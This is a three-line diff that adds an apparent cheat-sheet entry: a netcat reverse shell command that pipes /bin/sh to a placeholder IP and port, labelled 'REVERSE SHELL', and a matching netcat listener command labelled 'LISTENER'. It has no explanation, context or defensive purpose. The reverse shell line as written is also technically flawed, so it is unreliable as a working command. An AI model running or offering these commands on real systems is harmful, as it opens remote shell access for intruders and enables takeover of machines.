@@ -1,0 +1,3 @@
+/bin/sh | nc (ip) (port)  -REVERSE SHELL
+
+nc -nvlp (port) -LISTENER
